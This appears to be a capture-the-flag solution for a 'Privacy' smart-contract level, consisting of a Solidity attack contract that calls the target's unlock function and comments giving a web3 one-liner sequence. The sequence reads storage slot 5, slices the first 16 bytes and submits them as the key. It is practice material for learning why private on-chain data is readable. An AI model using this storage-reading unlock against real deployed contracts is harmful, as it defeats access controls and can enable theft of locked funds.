// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";

contract PrivacyAttack {

    Privacy privacyContract;

    constructor(address _privacyContract) {
        privacyContract = Privacy(_privacyContract);
    }

    function unlock(bytes32 _key) external {
        privacyContract.unlock(bytes16(_key));
    }

}

//Solve from web3 only 
//var key = await web3.eth.getStorageAt(contract.address, 5)
//var key16 = key.slice(0, /*0x */ 2 + /*2 each*/ 2 * /*16 the first half*/ 16)
//await contract.unlock(key16)